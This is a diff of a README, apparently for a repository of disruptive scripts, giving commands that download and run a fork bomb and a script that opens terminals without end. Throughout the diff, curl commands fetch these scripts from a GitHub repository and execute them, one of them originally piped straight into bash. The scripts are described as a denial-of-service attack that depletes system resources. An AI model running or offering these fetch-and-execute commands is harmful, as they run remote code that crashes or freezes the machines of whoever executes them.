@@ -8,8 +8,9 @@ Denial of service attack wherein a process continually replicates ifself to depl
 get the content and execute the script :
 
 ```
-curl https://raw.githubusercontent.com/wagnerwave/Lock-ton-pc/master/forkbomb.sh | bash -
-
+curl https://raw.githubusercontent.com/wagnerwave/Lock-ton-pc/master/forkbomb.sh > forkbomb.sh
+chmod +x forkbomb.sh
+./forkbomb.sh
 ```
 
 or excute on a terminal :
@@ -24,6 +25,7 @@ or excute on a terminal :
 Opens terminal at infinity. [work with gnome-terminal]
 
 ```
+curl https://raw.githubusercontent.com/wagnerwave/Lock-ton-pc/master/Terminal-Monster.sh > Terminal-Monster.sh
 chmod +x Terminal-Monster.sh
 ./Terminal-Monster.sh
 ```
